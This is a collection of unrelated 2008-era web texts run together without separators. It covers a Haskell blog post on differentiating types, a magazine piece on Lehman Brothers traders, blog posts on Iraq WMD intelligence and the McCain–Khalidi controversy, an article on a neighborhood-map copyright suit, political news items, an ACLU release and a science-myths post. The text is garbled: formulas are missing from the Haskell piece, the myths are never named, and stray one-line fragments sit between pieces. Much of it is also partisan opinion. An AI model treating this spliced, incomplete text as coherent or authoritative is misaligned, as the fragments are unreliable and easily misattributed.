For recursive types like BTree suppose we punch a hole at a particular level ( in this example , in ) .
Here , the container is one level in the tree , and the element is the immediate subtree .
By punching a hole for this element we get what we ’ve been calling the “ step type ” .
So for step types we do n’t differentiate the tree , but rather one level of the tree .
Just to make this clearer , consider the type [ String ] .
We can represent this with a fixed point :
Now , I have n’t given you the differentiation rule for ( the chain rule is involved here ! ) so accept for the moment that :
d [ String ] / dString " is isomorphic to " [ String ] *[ String ]
Where “ is isomorphic to ” means that syntactically differentiating [ String ] will give us an expression which is “ essentially the same as ” [ String ] * [ String ]
Notice that this result makes sense :
The context of a String in a list of Strings should be a pair of strings : the list of its predecessors and the list of its successors .
On the other hand , [ String ] is a recursively defined type .
So I could consider its “ step type ” .
This would be :
Again , this makes sense .
If a step is a , then a sequence of these steps will give us back the list of Strings .
By the way it makes no sense to differentiate something of the form with respect to .
Why ?
Doing this for real
I ’ve been busy implementing this in Template Haskell ( although for a different purpose ) .
McBride ’s types do n’t map directly to Haskell types so there are some problems , but they ’re quite easy to circumvent .
For one thing you ’ll notice that McBride dispenses with data constructors , but we have to keep track of them if we are to “ plug in ” an element back into its context .
But this is not really a “ problem ” .
There are other niggles such as the fact that McBride does not deal with parametrized types , or mutually recursive types ( directly ) .
On the other hand something like cannot be expressed directly in Haskell : it will have to be broken up into something like and ( with data constructors ) .
But really the biggest problem in the implementation has been Template Haskell itself .
Do n’t get me wrong : TH is actually quite nice and very , very powerful .
Its just that Haskell AST ’s are complicated , and you need a bit of time to get used to using the TH system ( btw if you ’re looking to learn TH I recommend these :
http://www.haskell.org/bz/thdoc.htm and http://www.haskell.org/bz/th3.htm are great ) .
I guess Lisp ’s simpler syntax is a huge gain as far as macro systems are concerned .
Also I ’m guessing you would n’t get stuck inside the quotation monad there since impure functions are OK ?
Anyway it ’ll be some time before I can put up the derivative code since it is a part of something else , but TH usage has given me some interesting ideas for other projects .
It really is quite powerful !
Recommended reading
If you want things to be more precise , you ’ll have to look at McBride ’s paper .
You might also want to look at “ dissection ” of types , which is the next logical step in a sense .
But in any case , I highly recommend this post on sigfpe ’s excellent blog .
It really makes you think about how deep this connection between might be .
Is it all just an artifact of our notation ?
Which of the results and concepts from differential calculus have meaning in the world of types ?
Could we assign some meaning to integration ( other than just inverse differentiation ) ?
Some pretty interesting questions here – any answers ?

Police are seen on video fracturing a man 's elbow and busting into his car , all the officers are in trouble now

The ’97 Barbaresco was not supposed to be opened for this .
Stashed under a desk on the third floor of Lehman Brothers ’ Seventh Avenue headquarters , the bottle awaited an appropriate victory .
Like food , wine pairs well with vast sums of money .
But on Friday , September 12 , as Lehman ’s stock flatlined at $ 3.65 per share , the Trader knew it was time to uncork the Santo Stefano .
He was in his late thirties , at the prime of his earning potential , a standout in one of Lehman ’s profitable trading divisions .
When the stock price had fallen below $ 20 a share in July , the Trader knew things were bad but took solace in the prospect of one more bonus cycle .
Things are bad ; things will be bad for a while .
We ’ll hunker down and survive , he had thought then .
But the fact that the Trader ’s desk met its targets in August meant nothing at Lehman , where cascading losses from a few epic bets on commercial real estate triggered a firmwide meltdown .
As one recently laid - off Lehman staffer said , in characteristic Wall Street vernacular , “ These assholes on another floor completely dropped our pants . ”
Around 5:30 p.m. on Friday , as the reality sank in , the Trader assembled his staff .
With the weekend looming , this would likely be the last time they would gather at Lehman as a team .
The eight colleagues , friends really , stood around glowing Bloomberg terminals as the $ 700 Barbaresco was poured into paper cups .
A crowd formed .
Champagne was brought out .
What they did n’t know was that upstairs , Lehman lawyers and bankers were negotiating with counterparts at Barclays , Bank of America , and the Fed , piecing together a deal .
After a few minutes , the Trader was called over to open the books for the counterparties .
He brushed his teeth , scrubbing the scent of wine from his breath .
Leaving work at nine that evening , the Trader knew that Lehman Brothers , as he ’d known it , was at an end .
The culture would change , inevitably .
But at that moment , he could n’t conceive of the firm ’s actually going bankrupt .
The Trader had come to Lehman only a year ago , after being recruited from a rival firm .
He ’d studied physics as a grad student , then come to Wall Street as the tech bubble and the aggressive gentrification of the Giuliani years remade Manhattan into a banker ’s playground , a place where a $ 2 million salary could seem like the norm .
Like many on Wall Street , the Trader ’s career was moving along briskly .
By 2006 , he had settled into a new $ 2 million house in Connecticut with a pool , and kept a pied - à - terre in Manhattan .
With two young children , he had private - school tuition to cover .
He had recently completed a home renovation , and now there was talk of a new porch with a built - in stainless - steel barbecue .
The Trader estimated that he was two years from making enough money to retire and never have to work again .
But by Saturday , September 13 , Lehman Brothers teetered on the precipice of bankruptcy after Barclays and Bank of America walked away from a deal .
The Trader was certain of little , except that he was a lot poorer .
The unvested stock from his previous year ’s bonus , once worth $ 3 million , was now reduced to a scant $ 6,000 .
And on Wall Street , self - worth and net worth can amount to the same thing .
“ The hardest thing in my mind is to have your compensation cut , ” a veteran Wall Street executive says .
“ It ’s almost like you ’re a bad person . ”
At a dinner party in Darien that evening , the conversation was a mix of denial and panic .
An executive from UBS lamented what the Lehman meltdown would mean for Wall Street .
“ This is going to be a disaster , ” the executive said .
The executive ’s wife nervously tried to steer the topic toward lighter subjects .
She kept talking about summer vacation .
And then she turned to the Trader and asked , “ What do you do ? ”
The collapse of the world ’s most powerful wealth - creating engine required everyone to take stock of their financials .
One Lehman executive in Rye Brook , fretting about paying off a Hamptons summer house and a ski chalet in Vermont , panicked on Monday morning and laid off her nanny , who had been with the Westchester family for nine years .
“ The nanny called me crying , ” says Marla Sanders , who runs Advance Nannies and staffs Lehman homes .
“ One of the children she had brought home from the hospital . ”
Sanders knows more cuts for her clients are on the way .
“ They ’re going to have to sell homes .
The question is , will the homes sell ?
They ’re cutting some of the children ’s activities out , dance class , acting class .
Are they going to have flowers delivered every day to their homes ?
I do n’t think so ! ”
Of course , this is one of the meanings of moral hazard , that term that ’s been used so much in recent months .
At this level , it ’s not a tragedy so much as the end of a specific vision of the American good life , one that ’s helped to define the city and its suburbs for more than a decade .
Pain was relative .
“ One of my managers , he ’s a guy who is a little bit older , ” one low - level Lehman staffer said on September 16 .
“ He has an $ 800,000 mortgage , a wife who ca n’t work , and two kids .
That gives you a little perspective . ”
On Friday , September 12 , the Wall Street Journal reported that Lehman ’s former president , Joe Gregory , who was demoted along with former CFO Erin Callan in a management shake - up in June , was listing his Bridgehampton house on Surfside Drive for $ 32.5 million .
The collapse of Lehman ’s stock is a blow to Gregory ’s lifestyle .
He reportedly used to travel by helicopter to midtown from his $ 3.5 million mansion in Huntington , which was recently renovated , according to a Sotheby ’s broker .
According to one source , Gregory ’s financial adviser was in negotiations with Lehman ’s attorneys at Simpson Thacher & Bartlett , working to avert his filing for bankruptcy , after he borrowed money against his Lehman stock to pay for the renovation .
“ He owes a lot of money for it .
They called the margin loan ” late last week , the source said .
( Gregory and attorneys did n’t return calls for comment . )
And some around the city met the crisis with a kind of glee .
“ What do you think just happened to the lifestyles of all the guys who girls want to meet ? ” one hedge - fund analyst wondered .
“ This is the best time ever to maintain ten girlfriends .
You could be an African tribal leader ! ”
“ Wall Street is like the auto industry in the seventies , which had a product that exploded on impact . ”
In the days after the fall of Lehman , Craigslist attracted several posts from people who said they were Lehman employees , becoming a kind of clearinghouse for the detritus of the Wall Street male ego .
On September 17 , one banker put his East 91st Street apartment up for rent and with it , his bachelorhood .
( “ I can no longer afford my apartment seeing as Lehman Brothers felt the need to steal my money and my soul … I am moving in with my girlfriend . ” )
Another headline read , “ Should I leave my fiancé ? … I guess I already know the answer .
My boyfriend … rather fiancé , is / was employed by Lehman Brothers , ” the posting stated .
“ In less than a week we went from being millionaires to just having a couple of 100K … I suppose this means it ’s over .
I am who I am .
I personally blame all this on [ Lehman CEO ] Dick Fuld .
I blame him for ruining my happiness . ”
Riding the Metro - North into Grand Central on Monday morning , September 15 , the Trader stood out in his jeans and T - shirt among the rows of suits .
A few passengers on the early - morning banker train were similarly dressed , and it was clear to all the commuters to what office guys in jeans , but reading the Journal , were headed .
Like Bear Stearns , Lehman ’s culture was built on fierce loyalty to the firm .
Senior staffers were granted bonuses that would be paid with 50 percent or more in Lehman stock , which they could n’t unload for five years .
In July , Dick Fuld approved a move to guarantee staffers a part of their bonuses midyear .
But the plan backfired when staffers learned that they ’d be assured only 20 percent of their previous year ’s bonus and would receive restricted stock at $ 21 per share ( “ Great , so you basically shorted my own compensation , ” one Lehman staffer groused ) .
At the Seventh Avenue headquarters , the Trader watched it all unfold like a nightmare .
Managers instructed the staff not to trade .
The company blocked outgoing e-mails with attachments .
A colleague frantically called human resources to find out if his wife , who was due to give birth any day now , would be covered by Lehman ’s benefits plan .
With no instructions from the top , the Trader took his colleagues down to a lunch at Pastis .
The next day at around 3:30 in the afternoon , Bart McDade , Lehman ’s president and COO , roamed the trading floor with Barclays president Robert Diamond , who traveled from London to inspect his new prize .
The men told staffers they had agreed to a deal for Barclays to acquire Lehman .
They had set aside a bonus pool for this year , and it would be paid 75 percent in cash .
Even if the Barclays deal would save many jobs , staffers were outraged at Fuld .
Since Friday , September 12 , Fuld ’s domineering presence had all but disappeared from Lehman ’s headquarters , and he was assigned a security detail .
“ They are sneaking him in and out of this place , ” a senior Lehman staffer said .
“ They would n’t let him near this deal .
It was for his own safety . ”
Asked what Fuld could do at this point to make it up to his company , the Trader said , “ Stand naked in Times Square while I Tase you . ”
Lehman staffers in London felt particularly stung .
Barclays acquisition includes only Lehman ’s New York operations , meaning that the employees at Canary Wharf are going to be jettisoned .
On the morning of September 17 , one London managing director sent a terse e-mail to Lehman ’s president , and cc’d the entire London office .
The message — subject line : “ To Tom , Michael and Bart : The Email that Never Came ” — complained bitterly that New York never expressed gratitude for London ’s efforts even while they were thrown under the bus .
Then , just before 10 p.m. on September 16 , Fuld finally sent a memo to the staff .
“ I know that this has been very painful on all of you both personally and financially , ” he wrote .
“ For this , I feel horrible . ”
It was the apology the staffers had sought for days .
On September 17 , word filtered through the office that Barclays would keep people on for only several months as they figured out whom they wanted to retain .
One staffer remarked that he was glad he had decided not to enroll his kid in private school .
“ It ’s sinking in how much money people have and what they can afford going forward , ” the Trader said .
On Saturday , September 13 , the Trader took his 8 - year - old son to his first Yankees game , against Tampa Bay .
“ My 8 - year - old is asking me questions about the economy .
And I ’m thinking , You should really think about baseball , ” the Trader said .
The Trader paid for great seats .
They sat fieldside in the languid summer afternoon , six rows from the Yankees dugout .
When the Yankees took the field , the Trader ’s son erupted in cheers .
“ Jeter ! Jeter ! Jeter ! ” he yelled , but the players jogged out to the field , with scarcely a glance toward the stands .
“ Daddy , why does n’t he answer ? ” the son asked .
And suddenly , the Trader boiled with anger .
He had done his part , put in the sixteen - hour days to buy his kid the best seats in the stadium .
Lehman , and the career he signed up for , was disappearing in front of his eyes .
Yet the Yankees were losing , and Derek Jeter was still going to take home his $ 21 million , and he could n’t even bother to show some gratitude .
It was a fantasy world , out of touch .
“ Those guys have the easiest job , ” the Trader thought , “ when it ’s clear they do n’t care .
Fuck , in my next life I want to be a baseball player . ”

George Tenet And White House Admit Iraq 's Intelligence Chief Told Them Iraq Had No WMD
Ron Suskind was on NPR this morning to discuss his new book The Way of the World , which alleges Iraq 's intelligence chief Tahir Jalil Habbush told the US before the war that Iraq had no WMD .
NPR asked George Tenet and the White House for comment , and , remarkably enough , they both essentially admitted this was true .
SUSKIND : What we now know from this investigation is that a secret mission was conducted in which a British manager , intelligence agent , met with the head of Iraqi intelligence in a secret location in Amman , Jordan .
And what the Iraqi intelligence chief told the British — and essentially the Americans , because we 're all in this together — is that there were no WMD in Iraq .
And what that meant is that we knew everything that became so obvious by the summer after the invasion .
And the president made a decision essentially to ignore that intelligence ...
NPR : We have called key players in Ron Suskind 's account ... George Tenet says the Iraqi failed to persuade , and a White House spokesman adds that any information the Iraqi may have provided was , quote , " immaterial . "
Further corroboration appears in a November , 2003 New York Times story by James Risen .
Risen 's article is about last - minute attempts by Iraq to avert war , using a Lebanese - American intermediary named Imad Hage who knew Richard Perle :
A week [ after February , 2003 meetings in Beirut with the Iraqi Intelligence Service 's chief of foreign operations ] , Mr. Hage said , he agreed to hold further meetings in Baghdad .
When he arrived , he was driven to a large , well - guarded compound , where he was met by a gray - haired man in a military uniform .
It was Tahir Jalil Habbush , the director of the Iraqi Intelligence Service , who is No. 16 on the United States list of most wanted Iraqi leaders .
Mr. Hage said Mr. Habbush asked him if it was true that he knew Mr. Perle .
" Have you met him ? " Mr. Hage said Mr. Habbush began to vent his frustration over what the Americans really wanted .
He said that to demonstrate the Iraqis ' willingness to help fight terrorism , Mr. Habbush offered to hand over Abdul Rahman Yasin , who has been indicted in United States in connection with the 1993 World Trade Center bombing .
Mr. Yasin fled to Iraq after the bombing , and the United States put up a $ 25 million reward for his capture .
Mr. Hage said Mr. Habbush offered to turn him over to Mr. Hage , but Mr. Hage said he would pass on the message that Mr. Yasin was available .
Mr. Hage said Mr. Habbush also insisted that Iraq had no weapons of mass destruction and added , " Let your friends send in people and we will open everything to them . "
Mr. Hage said he asked Mr. Habbush , " Why do n't you tell this to the Bush administration ? "
He said Mr. Habbush replied cryptically , " We have talks with people . "
Mr. Hage said he later learned that one contact was in Rome between the C.I.A. and representatives of the Iraqi intelligence service .
American officials confirm that the meeting took place , but say that the Iraqi representative was not a current intelligence official and that the meeting was not productive .
In addition , there was an attempt to set up a meeting in Morocco between Mr. Habbush and United States officials , but it never took place , according to American officials .
This can be added onto the pile :
• The CIA sent thirty relatives of Iraqi scientists to Iraq to ask them what WMD Iraq had , and they uniformly reported it had nothing .
• Iraq 's foreign minister Nouri Sabri secretly told the US in 2002 that Iraq had no active WMD programs .
• Alan Foley , the head of the CIA 's Weapons Intelligence Non-Proliferation and Arms Control Center , told an acquaintance just before the war that he expected we would find " Not much , if anything . "
UPDATE : The White House actually refers to the Risen reporting in its statement on Suskind 's book :
This is a rehash of very old reporting -- reports of this particular contact were reported on extensively in 2003 .

I do n't know what it is about the Nobel Prize that makes economists fall in love with John Maynard Keynes , but once again I see a Nobel winner trying to convince us that the Keynesian package is sound economics .
This time it is Joe Stiglitz throwing idiocy at us in the name of economic authority .
While most of his article is pretty bad , he manages to outdo himself here :
During the Great Depression , similar arguments were heard : government need not do anything , because markets would restore the economy to full employment in the long run .
But , as John Maynard Keynes famously put it , in the long run we are all dead .
Markets are not self - correcting in the relevant time frame .
No government can sit
idly by as a country goes into recession or depression , even when caused by the excessive greed of bankers or misjudgment of risks by security markets and rating agencies .
But if governments are going to pay the economy 's hospital bills , they must act to make it less likely that hospitalization will be needed .
The right 's deregulation mantra was simply wrong , and we are now paying the price .
And the price tag -- in terms of lost output -- will be high , perhaps more than $ 1.5 trillion in the United States alone .
The right often traces its intellectual parentage to Adam Smith , but while Smith
recognized the power of markets , he also recognized their limits .
Even in his era ,
businesses found that they could increase profits more easily by conspiring to raise prices than by producing innovative products more efficiently .
There is a need for strong anti-trust laws .
This is most interesting .
We are hearing the need for another " New Deal , " but the New Deal was all about the government creating cartels and limiting output .
But , now we have Stiglitz telling us that the trouble is those damned markets and not enough anti-trust .
Oh , like his good friend and partner - in - crime Paul Krugman , Stiglitz rewrites the history of the Great Depression .
The problem was that the markets did not correct because the government blocked both the correction and the recovery .
But , being a Nobel winner means one does not have to stick with the truth when fabrications will do just fine .
Tell me your birthday so I can tell you morbid stuff .

A mathematician who pioneered a fractal - based urban - mapping technique is embroiled in a copyright battle that raises legal questions about whether a company can claim ownership of the definition of neighborhoods : their specific locations and boundaries .
The dispute highlights a growing movement to quantify the amorphous tendrils connecting communities .
Bernt Wahl had the idea in 2004 to use a blend of mathematical modeling and old - fashioned shoe leather to map out unofficial neighborhoods � areas like Bernal Heights in San Francisco , or New Orleans ' French Quarter � whose borders are drawn mostly in the minds of the inhabitants .
Since then , he 's produced maps defining more than 18,000 neighborhoods in 350 U.S. and international cities , which are used in everything from search localization to epidemiology .
The Federal Deposit Insurance Corp. is currently using Wahl 's maps to better understand which neighborhoods are being slammed hardest by the mortgage crisis .
Vermont - based mapping company Maponics is now suing
Wahl to keep him from creating any more neighborhood maps " derived from or containing parts of " the original maps he produced four years ago , which defined 7,000 neighborhoods in 100 cities .
Wahl did that work as a contractor for a real estate web portal , which then sold the copyright to Maponics .
Because American 's biggest metropolitan areas were included in the original batch of maps , the lawsuit could effectively bar Wahl from the mapmaking business for good .
The lawsuit highlights the growing importance of neighborhood data in web applications and science .
Since
Wahl pioneered the industry four years ago , other companies have entered the neighborhood - mapping field , which has swollen into a big part of a $ 17 billion localized - mapping industry , says Ian White , CEO of San Francisco - based Urban Mapping .
Neighborhood mapping is being used for marketing , siting new retail outlets , social networking , and analyzing crime patterns and earthquake damage .
Yahoo announced in June that it had licensed neighborhood - mapping data from Urban Mapping for 2,000 U.S. cities .
Earlier this year , Zillow opened its database of 7,000 neighborhoods to the world under a Creative Commons license .
" Everyone made out like a bandit except me , " Wahl says .
Wahl began his work when he was contracted by real estate portal HomeGain to optimize the firm 's search engine .
At that time , real estate site maps were organized either by ZIP code or by census tract , which are both fairly arbitrary shapes drawn with disregard for the differences in the neighborhoods within .
The Thomas Guides have long noted neighborhoods , but did not attempt to define where they begin and end .
Wahl saw that as a fatal flaw .
" Neighborhoods are really important , " he says .
" For example , there 's a census tract that combines downtown Berkeley and North Berkeley .
In Berkeley hills , the average age is 57 , and downtown it 's 24 .
The incomes and values are completely different .
It made me start thinking that we needed a different way to let people look for homes . "
Working with 15 student interns ,
Wahl began phoning local - government planning departments , chambers of commerce and other community sources in hundreds of cities .
" There 's usually a librarian in each place who remembers the neighborhoods � the trick is finding them , " Wahl says .
" And you have to be careful about what people tell you , because they can tend to bleed their home into a better neighborhood . "
Using the anecdotal data ,
Wahl drew polygons that contain the neighborhoods , then tacked them to base maps created by the U.S. Census .
The new maps hit big .
HomeGain went from limping into its last few million dollars of startup capital to being one of the leading real estate search sites .
The company was eventually sold to a consortium of five giant newspaper companies , including the Washington Post .
When HomeGain 's management changed , the new bosses sold Wahl 's first neighborhood map data to Maponics for $ 40,000 .
Wahl had permission to keep selling and using the data for 60 days , according to court documents .
" They gave me $ 5,000 , " Wahl says .
Wahl has continued to develop his data , refining the boundaries on his U.S. maps , and expanding internationally to Asian and European cities in 30 countries .
His customers include Craigslist and Ask.com , and he gives away data at no charge to researchers , including those at the FDIC , and to epidemiologists working with the Centers for Disease Control to track the spread of disease .
" We are n't getting rich off this , though clients do pay for the data , " Wahl says .
" We try to get the data out everywhere we can , so we can see how people are using it � that 's very interesting .
It 's about public service and the public good as much as making money . "
But the low price tag for Wahl 's maps is precisely what irks Maponics , which accuses Wahl , and his company , Factle , of offering the data at " fire - sale prices . "
Last year , Maponics contacted one of Wahl 's customers , Toursheet.com , and demanded the social place - marking site stop using Wahl 's data .
" It allows ... Toursheet to use a common map to show the attitude of the neighborhood , so people can have a real sense of community , " says founder Kyle Else .
" Well , it did before I heard from Maponics ....
They threatened my future development .
I missed my window because of their threats , and I 'm stuck in limbo until this is sorted out . "
Maponics filed suit in federal court in Los Angeles in November 2007 accusing Wahl of copyright infringement and unfair competition .
" We 're not out to put Bernt out of business , " says George Frost , Maponics ' attorney .
" If they 've got another product that is n't related to our product , they 're free to sell it .
But the software and information that went into it belong to us . "
Maponics CEO
Darrin Clement has said in e-mails to Wahl 's customers that Wahl " stole " Maponics data .
That 's prompted Wahl to countersue for defamation .
Wahl believes neighborhood boundaries are in the public domain .
" I do n't know how anyone can say they own it , " Wahl muses .
He argues there 's more at stake than just profits .
" This data literally saves lives , " says Wahl .
" We could make more money at other jobs or selling the data for market value , but want we want to do is save lives and save the world .
That starts at the neighborhood . "

by Juan Cole of Informed Comment ( re-posted with permission )
The increasingly sleazy John McCain , who once promised to run a clean campaign , has now attacked my friend Rashid Khalidi and attempted to use him against Barack Obama .
Khalidi is an American scholar of Palestinian heritage , born in New York and educated at Yale and Oxford , who now teaches at Columbia University .
He directed the Middle East Center at the University of Chicago for some time , and he and his family came to know the Obamas at that time .
Knowing someone and agreeing with him on everything are not the same thing .
Scott Horton has a fine , informed and intelligent discussion of the issue .
I know it may seem a novel idea to people like McCain and Palin , but it would be worthwhile actually reading Khalidi ’s book on the Palestinian struggle for statehood .
( I urge bloggers interested in this issue to link to his book , which the American reading public should know ) .
At the least , read a whole essay Khalidi has written .
Far from being a knee - jerk nationalist , Khalidi has been critical of the decisions of the Palestinian leadership at key junctures in modern history .
McCain ’s and Palin ’s attacks on Khalidi are frankly racist .
He is a distinguished scholar , and the only objectionable thing about him from a rightwing point of view is that he is a Palestinian .
There are about 9 million Palestinians in the world ( a million or so are Israeli citizens ; 3.7 million are stateless and without rights under Israeli control in the West Bank and Gaza ; and 4 million are refugees or exiled in the diaspora ; there are about 200,000 Palestinian - Americans , and several million Arab - Americans , many living in swing vote states ) .
Khalidi was not , as the schlock rightwing press charges , a spokesman for the Palestine Liberation Organization .
He was an adviser at the Madrid peace talks , but would that not have been , like , a good thing ?
Much of the assault on Khalidi comes from the American loony Zionist Right , which quietly supports illegal Zionist colonies in the West Bank and the ethnic cleansing of the remaining Palestinians .
They have been tireless advocates of miring the US in wars in Iraq and Iran to ensure that their dreams of ethnic cleansing are unopposed .
They are a tiny , cranky but well - funded group that has actively harassed anyone who disagrees with them ( at one point , cued by Daniel Pipes , they cyberstalked Khalidi and clogged his email mailbox with spam for weeks at a time ) .
All opinion polling shows that most American Jews are politically liberal , overwhelmingly vote Democrat , and support trading land for peace to resolve the Israeli - Palestinian conflict .
Khalidi is their political ally in any serious peace process , which many have recognized .
Former Israeli Prime Minister Ehud Olmert has repudiated the “ Greater Israel ” fantasy that drives the Middle East Forum , the Washington Institute for Near East Policy , Commentary , the Jewish Institute for National Security Affairs , the Hudson Institute , the American Enterprise Institute and other well - funded sites of far - right thinking on Israel - Palestine that have become , with the rise of the Neoconservatives , highly influential with the US Republican Party .
Olmert ’s current position is much closer to Khalidi’s than it is to the American ideologues .
That McCain should take his cues from people to the right of the Neoconservatives shows fatal lack of judgment and signals that if he is elected , he will likely pursue policies that are very bad for Israel , forestalling a genuine peace process ( which would involve close relations with Palestinians ! )
McCain even compared the gathering for Khalidi that Obama attended to a “ neo - Nazi ” meeting !
I mean , really .
this is the lowest McCain has sunk yet .
McCain is bringing up Khalidi in order to scare Jewish voters about Obama ’s associations , and it is an execrable piece of McCarthyism and in fact much worse than McCarthyism since it is not about ideology but rather has racial overtones .
Not allowed to pal around with Arab - Americans , I guess .
What other ethnic groups should we not pal around with , from McCain ’s point of view ?
Is there a list ?
Are some worse than others ?
Ironically , as the Huffington Post showed , while John McCain was chairing the International Republican Institute , he gave over $ 400,000 to Rashid Khalidi ’s Center for Palestine Research and Studies for work in the West Bank .
Here is Lou Dobbs letting McCain have it over this piece of hypocrisy .
The rightwing American way of speaking about these issues is bizarre from a Middle Eastern point of view .
Lots of real living Israelis have close ties to actually existing Palestinians .
There are 12 Palestinian members of the Israeli Knesset , and they have helped keep the Kadima government in power .
Here is PLO leader Mahmoud Abbas with current Israeli Prime Minister Tzipi Livni ; Livni has repeatedly negotiated with the PLO as foreign minister of Israel .
McCain ’s entire line of attack assumes that Palestinian equals “ bad ” and ignores Israel ’s and the Bush administration ’s support for the PLO against Hamas .
As the Young Turks pointed out , before the ‘ straight talk express ’ became the ‘ mealy - mouthed train wreck , ’ McCain advocated direct negotiations with Hamas when it was in control of the Palestinian Authority after the 2006 elections .

Back in 1993 when Bill and Hillary Clinton were trying to achieve real health care reform in this country , an industry - lobbyist group called the Health Insurance Association of America ran a highly successful ad called " Harry and Louise " which featured a white middle - class couple sitting at the kitchen table spewing Republican talking points and talking about the evils of universal health care .
The ad was so successful that it 's widely considered to be the main reason President Clinton 's plan failed .
But now Harry and Louise are back with a new message .
With national health care as one of the most important issues in the election , and with Republicans poised to distort the debate once again , a number of groups have come together with a pre-buttal ad featuring the original actors that demands health care be made a top national priority .
The ad will run throughout the RNC .
Awesome .

Democrats have been loudly complaining about John McCain , Sarah Palin and other Republicans routinely misrepresenting Barack Obama 's tax plan by asserting the Democrat would raise the levies that Americans hate to pay across the board .
In a true shocker , even a Fox News anchor gave a McCain aide flack on the matter earlier this week .
Obama 's running mate , Joe Biden , today sought -- in his inimitable way -- to stress that the Democratic platform calls for increasing income taxes only for those making more than $ 250,000 a year .
But in the process , he delivered a line sure to be mocked far and wide by the GOP .
" You got it , " he said on ABC's " Good Morning America " when his interviewer noted that Obama was targeting the affluent .
" It 's time ( for the well - off ) to be patriotic . "
( See the clip below . )
Already , the Republican National Committee has sent off an e-mail flagging the quote .
And we 're betting it shows up quickly as a laugh line in McCain and Palin stump speeches .
[ UPDATE : Right on cue , Palin scoffed at Biden 's comment as she and McCain stumped late this morning in Iowa .
Telling her typically adoring crowd what the Delaware senator had said , she parried that raising taxes is n't about patriotism , it 's " about killing jobs and hurting small businesses and making things worse . " ]
[ UPDATE II : McCain , taking the stage after Palin , said of raising taxes in tough times : " It 's not a badge of honor .
It 's just plain dumb . " ]

Minnesota ACLU
Takes Legal Action
FOR IMMEDIATE RELEASE
CONTACT : ( 212 ) 549-2666 ; media@aclu.org
ST .
PAUL -
In response to reports of widespread civil liberties abuses in connection with mass arrests , police raids on private homes and the detention of several journalists during the Republican National Convention ( RNC ) , the American Civil Liberties Union renewed its call for an investigation into the actions of law enforcement there .
" Attempts by law enforcement to squelch lawful political speech and stifle the press have no place in our democracy and are unacceptable , " said Anthony D. Romero , Executive Director of the ACLU .
" Political conventions should be a showcase for free expression , not a venue for bullying and intimidation . "
The ACLU specifically called for an investigation into possible violations of the First and Fourth Amendments , including :
the arrest of reporters trying to gather the news ;
the mass arrest of hundreds of peaceful protestors ;
the surveillance and subsequent raids on several activist groups and private homes ; and
the confiscation by law enforcement agents of constitutionally - protected private property .
The ACLU affiliate office in Minnesota has assembled legal counsel for many of the reporters and peaceful protestors arrested since Monday .
The ACLU of Minnesota has also filed a lawsuit in federal court calling for the release of boxes of literature that were confiscated during Monday 's raids .
For years , the Bush administration has faced charges that it bent the truth or flat - out misled the public about Iraq 's alleged stockpile of weapons of mass destruction in the lead - up to the 2003 invasion of the country .
Now , a study by two nonprofit journalism organizations claims that President Bush and top officials in his administration issued nearly 1,000 false statements about the security threat posed by Iraq in the wake of 9/11 .
The results of the study were posted Tuesday on the Web site for the nonpartisan Center for Public Integrity , which worked on the project with the Fund for Independence in Journalism .
" On at least 532 separate occasions ( in speeches , briefings , interviews , testimony and the like ) , Bush and these three key officials [ Vice President Dick Cheney , National Security Adviser Condoleezza Rice and former Defense Secretary Donald Rumsfeld ] , along with former Secretary of State Colin Powell , former Deputy Defense Secretary Paul Wolfowitz , and former White House press secretaries Ari Fleischer and Scott McClellan , stated unequivocally that Iraq had weapons of mass destruction ( or was trying to produce or obtain them ) , links to al Qaeda or both .
This concerted effort was the underpinning of the Bush administration 's case for war , " reads the report .
Entitled " False Pretenses , " the report claims that the statements were " part of an orchestrated campaign that effectively galvanized public opinion and , in the process , led the nation to war under decidedly false pretenses . "
According to The Associated Press , White House spokesman Scott Stanzel said he could not comment on the study because he had not seen it .
Of the 935 false statements made by the administration , according to the study , Bush was reported to have led all White House officials with 259 false statements , which included 231 about weapons of mass destruction in Iraq and 28 about Iraq 's links to al Qaeda .
Second on the list was Powell with 244 false statements about weapons of mass destruction in Iraq and 10 about Iraq and al - Qaeda .
" It is now beyond dispute that Iraq did not possess any weapons of mass destruction or have meaningful ties to al Qaeda , " wrote authors Charles Lewis and Mark Reading - Smith of the Fund for Independence in Journalism .
" In short , the Bush administration led the nation to war on the basis of erroneous information that it methodically propagated and that culminated in military action against Iraq on March 19 , 2003 . "
Relying on what it described as a " massive database " of information that fed the results of the project , the authors said their research was based on juxtaposing what President Bush and the top officials in his administration said in public against what was known , " or should have been known , on a day - to - day basis . "
The searchable database includes public statements drawn from both primary sources like official transcripts and secondary sources like the reporting of major news organizations over the two years beginning on September 11 , 2001 .
It also used information from more than 25 government reports , books , articles , speeches and interviews .
An example given in the report is a portion of an address given at the national convention of the Veterans of Foreign Wars on August 26 , 2002 , during which Cheney said , " Simply stated , there is no doubt that Saddam Hussein now has weapons of mass destruction .
There is no doubt he is amassing them to use against our friends , against our allies and against us . "
According to the report , former CIA Director George Tenet later said Cheney 's assertions went well beyond his agency 's assessments at the time , and another CIA official , referring to the speech , told a prominent journalist , " Our reaction was , ' Where is he getting this stuff from ? ' "
The study came under immediate fire from some conservative bloggers , who painted it as " leftist propaganda " and pointed out that it came from an organization funded by billionaire George Soros , who has given millions to a number of liberal think tanks and advocacy organizations .
Steve Carpinelli , a spokesman for the Center , denied the charges and said the organization does not advocate any agenda , endorse any legislation or engage in any of the actions of an advocacy group .
" What we 've included here is all factual information that we were able to quantify and put into a form that people can search using a database , " said Carpinelli , who added that Soros contributed general funds to the organization in 2004 , but that those funds were not used for the report and that they were not nearly the " millions " quoted by detractors .
As for criticism that the report does not have any new information but rather rehashes already - reported facts , Carpinelli said , " The difference is that while there have been many intelligence reports that came out that contradicted a lot of statements from administration officials , there 's been nothing that could show you how it was a coordinated effort . "
The report is accompanied by a bar graph that Carpinelli said shows how the false statements reached their peak in the months prior to the March 2003 launch of the Iraq war and how they tapered off soon after .
Dr.George Fishbeck .
A TV scientist who would teach children how to look out for bad science .
We need more men like him .
I thought I ’d put together a list of a few scientific myths that I ’ve overheard , then researched and found out to be completely false .
For the record , I do n’t watch Myth Busters but I ’d imagine that a few of the myths I write about may have been busted by them already .
Regardless , none of my sources are from their show : I was reminded of this fact twice by my little brother and once on television by a news commentator .
However , after doing a bit of research on NASA and a few other science sites it turns out that this notion is completely false .
Several tests were carried out by astronauts and it turns out that it ’s not even visible from high altitudes outside of the earth 's atmosphere .
I was reminded of this supposedly scientific fact every day by my auntie .
Luckily I avoided her advice because in the recent months a few publications have outwardly denied these drinking requirements .
In fact , some scientific research has suggested that drinking this much water may have negative effectives on your health .
